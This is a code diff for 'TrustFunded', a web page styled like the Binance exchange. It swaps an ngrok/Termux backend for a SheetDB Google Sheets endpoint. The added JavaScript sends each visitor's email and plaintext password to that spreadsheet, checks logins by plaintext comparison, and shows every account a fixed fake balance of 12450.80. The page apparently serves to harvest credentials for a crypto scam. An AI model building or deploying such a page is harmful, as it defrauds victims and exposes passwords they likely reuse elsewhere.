@@ -10,6 +10,7 @@
     <!-- Font Awesome for login icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
+        /* ========= ORIGINAL LOADER STYLES (PRESERVED) ========= */
         :root {
             --binance-yellow: #FCD535;
             --bg-dark: #0B0E11;
@@ -25,6 +26,7 @@
             overflow: hidden; 
         }
 
+        /* Full-screen Loader Container */
         #loader-wrapper {
             position: fixed;
             top: 0;
@@ -257,7 +259,7 @@
             cursor: not-allowed;
         }
         
-        .server-status {
+        .status-badge {
             position: fixed;
             bottom: 10px;
             right: 10px;
@@ -265,12 +267,8 @@
             background: rgba(0,0,0,0.5);
             padding: 4px 8px;
             border-radius: 10px;
-            color: #ff6b6b;
-            z-index: 9999;
-        }
-        
-        .server-status.connected {
             color: #0ecb81;
+            z-index: 9999;
         }
     </style>
 </head>
@@ -528,34 +526,17 @@
     </div>
 
     <div id="toast-message" class="toast-message"></div>
-    <div id="server-status" class="server-status">🔌 Connecting...</div>
+    <div id="status-badge" class="status-badge">📊 Connected to Google Sheets</div>
 
     <script>
         lucide.createIcons();
         
-        // ========= TERMUX API CONFIGURATION =========
-        // Your ngrok URL from Termux
-        const API_URL = "https://zincic-heimish-margert.ngrok-free.dev";
+        // ========= SHEETDB CONFIGURATION =========
+        // Your SheetDB API URL
+        const SHEETDB_API = "https://sheetdb.io/api/v1/pw5rowfqub6av";
         
-        // Check server connection on load
-        async function checkServerConnection() {
-            const statusDiv = document.getElementById('server-status');
-            try {
-                const response = await fetch(`${API_URL}/users`, {
-                    method: 'GET',
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                if (response.ok) {
-                    statusDiv.textContent = '✅ Server Connected';
-                    statusDiv.classList.add('connected');
-                } else {
-                    statusDiv.textContent = '⚠️ Server Error';
-                }
-            } catch (error) {
-                statusDiv.textContent = '❌ Server Offline - Check Termux';
-                console.error('Server connection failed:', error);
-            }
-        }
+        // Local storage key for users (backup)
+        const STORAGE_KEY = 'trustfunded_users';
         
         function showToast(msg, isSuccess = true) {
             const toast = document.getElementById('toast-message');
@@ -574,6 +555,104 @@
             } else {
                 button.disabled = false;
                 button.innerHTML = originalText;
+            }
+        }
+        
+        // Add a single user to SheetDB (plain text password)
+        async function addUserToSheet(user) {
+            try {
+                const response = await fetch(SHEETDB_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        data: {
+                            Timestamp: new Date().toLocaleString(),
+                            Email: user.email,
+                            Password: user.password,
+                            Referral: user.referral || '',
+                            Balance: user.balance || 12450.80,
+                            Created_At: user.createdAt || new Date().toISOString()
+                        }
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error adding user to SheetDB:', error);
+                return false;
+            }
+        }
+        
+        // Check if user exists
+        async function userExists(email) {
+            try {
+                const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
+                const users = await response.json();
+                return users && users.length > 0;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Verify login (plain text comparison)
+        async function verifyLogin(email, password) {
+            try {
+                const response = await fetch(`${SHEETDB_API}/search?Email=${encodeURIComponent(email)}`);
+                const users = await response.json();
+                const user = users.find(u => u.Password === password);
+                return user || null;
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        async function handleLogin() {
+            const email = document.getElementById('login-email').value.trim();
+            const password = document.getElementById('login-password').value;
+            const agree = document.getElementById('login-agree').checked;
+            const loginBtn = document.getElementById('login-btn');
+            
+            if (!email || !password) {
+                showToast('Please enter email and password', false);
+                return;
+            }
+            if (!agree) {
+                showToast('Please agree to the Terms of Service', false);
+                return;
+            }
+            
+            setButtonLoading(loginBtn, true, 'Continue to Dashboard');
+            
+            try {
+                const user = await verifyLogin(email, password);
+                
+                if (user) {
+                    localStorage.setItem('currentUser', JSON.stringify({
+                        email: user.Email,
+                        balance: user.Balance || 12450.80
+                    }));
+                    showToast('Login successful! Welcome to TrustFunded', true);
+                    setTimeout(() => {
+                        document.getElementById('login-overlay').classList.remove('active');
+                        document.body.classList.add('show-dashboard');
+                        document.body.style.overflow = 'auto';
+                        document.documentElement.style.overflow = 'auto';
+                        lucide.createIcons();
+                    }, 500);
+                } else {
+                    showToast('Invalid email or password', false);
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                showToast('Login failed. Please try again.', false);
+            } finally {
+                setButtonLoading(loginBtn, false, 'Continue to Dashboard');
             }
         }
         
@@ -600,16 +679,27 @@
             setButtonLoading(signupBtn, true, 'Create Account');
             
             try {
-                const response = await fetch(`${API_URL}/signup`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password, referral })
-                });
+                // Check if user exists
+                const exists = await userExists(email);
+                if (exists) {
+                    showToast('Email already registered. Please login.', false);
+                    setButtonLoading(signupBtn, false, 'Create Account');
+                    return;
+                }
                 
-                const result = await response.json();
+                const newUser = {
+                    email: email,
+                    password: password,
+                    referral: referral,
+                    createdAt: new Date().toISOString(),
+                    balance: 12450.80
+                };
                 
-                if (result.success) {
-                    localStorage.setItem('currentUser', JSON.stringify(result.user));
+                // Save to SheetDB
+                const saved = await addUserToSheet(newUser);
+                
+                if (saved) {
+                    localStorage.setItem('currentUser', JSON.stringify(newUser));
                     showToast('Account created successfully! Welcome to TrustFunded', true);
                     setTimeout(() => {
                         document.getElementById('login-overlay').classList.remove('active');
@@ -619,60 +709,13 @@
                         lucide.createIcons();
                     }, 500);
                 } else {
-                    showToast(result.error || 'Signup failed', false);
+                    showToast('Failed to create account. Please try again.', false);
                 }
             } catch (error) {
                 console.error('Signup error:', error);
-                showToast('Cannot connect to server. Make sure Termux is running with ngrok.', false);
+                showToast('Signup failed. Please try again.', false);
             } finally {
                 setButtonLoading(signupBtn, false, 'Create Account');
-            }
-        }
-        
-        async function handleLogin() {
-            const email = document.getElementById('login-email').value.trim();
-            const password = document.getElementById('login-password').value;
-            const agree = document.getElementById('login-agree').checked;
-            const loginBtn = document.getElementById('login-btn');
-            
-            if (!email || !password) {
-                showToast('Please enter email and password', false);
-                return;
-            }
-            if (!agree) {
-                showToast('Please agree to the Terms of Service', false);
-                return;
-            }
-            
-            setButtonLoading(loginBtn, true, 'Continue to Dashboard');
-            
-            try {
-                const response = await fetch(`${API_URL}/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    localStorage.setItem('currentUser', JSON.stringify(result.user));
-                    showToast('Login successful! Welcome to TrustFunded', true);
-                    setTimeout(() => {
-                        document.getElementById('login-overlay').classList.remove('active');
-                        document.body.classList.add('show-dashboard');
-                        document.body.style.overflow = 'auto';
-                        document.documentElement.style.overflow = 'auto';
-                        lucide.createIcons();
-                    }, 500);
-                } else {
-                    showToast(result.error || 'Invalid email or password', false);
-                }
-            } catch (error) {
-                console.error('Login error:', error);
-                showToast('Cannot connect to server. Make sure Termux is running with ngrok.', false);
-            } finally {
-                setButtonLoading(loginBtn, false, 'Continue to Dashboard');
             }
         }
         
@@ -752,15 +795,11 @@
         setInterval(updateLiveTicker, 5000);
         updateLiveTicker();
         
-        // Check server connection every 10 seconds
-        setInterval(checkServerConnection, 10000);
-        
         window.addEventListener('load', () => {
             setTimeout(() => {
                 document.body.classList.add('hide-loader');
                 setTimeout(() => {
                     document.getElementById('login-overlay').classList.add('active');
-                    checkServerConnection();
                 }, 800);
             }, 3200);
         });
